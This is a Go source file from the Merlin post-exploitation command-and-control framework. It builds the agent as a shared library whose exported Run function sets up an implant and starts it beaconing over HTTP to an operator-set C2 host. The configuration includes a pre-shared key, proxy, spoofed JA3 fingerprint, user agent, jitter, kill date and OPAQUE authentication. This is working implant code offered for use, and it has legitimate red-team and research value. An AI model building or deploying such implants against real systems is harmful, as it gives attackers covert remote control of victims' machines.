// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	"C"
	"os"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agent"
	"github.com/Ne0nd0g/merlin/pkg/agent/clients/http"
)

// GLOBAL VARIABLES
var urls []string
var protocol = ""
var build = "nonRelease"
var psk = ""
var proxy = ""
var host = ""
var ja3 = ""
var useragent = ""
var waittimemin int64 = 0
var waittimemax int64 = 0
var killdate = ""
var maxretry = ""
var padding = ""
var opaque []byte

func main() {}

func run(URLS []string) {
	// Setup and run agent
	agentConfig := agent.Config{
		WaitTimeMin: waittimemin,
		WaitTimeMax: waittimemax,
		KillDate: killdate,
		MaxRetry: maxretry,
	}
	a, err := agent.New(agentConfig)
	if err != nil {
		os.Exit(1)
	}

	// Get the client
	var errClient error
	clientConfig := http.Config{
		AgentID:     a.ID,
		Protocol:    protocol,
		Host:        host,
		URL:         URLS,
		Proxy:       proxy,
		UserAgent:   useragent,
		PSK:         psk,
		JA3:         ja3,
		Padding:     padding,
		AuthPackage: "opaque",
		Opaque:      opaque,
	}
	a.Client, errClient = http.New(clientConfig)
	if errClient != nil {
		os.Exit(1)
	}

	errRun := a.Run()
	if errRun != nil {
		os.Exit(1)
	}
}

//export Run
func Run(_Unused *C.void) *C.void {
	run(urls)
	return nil;
}
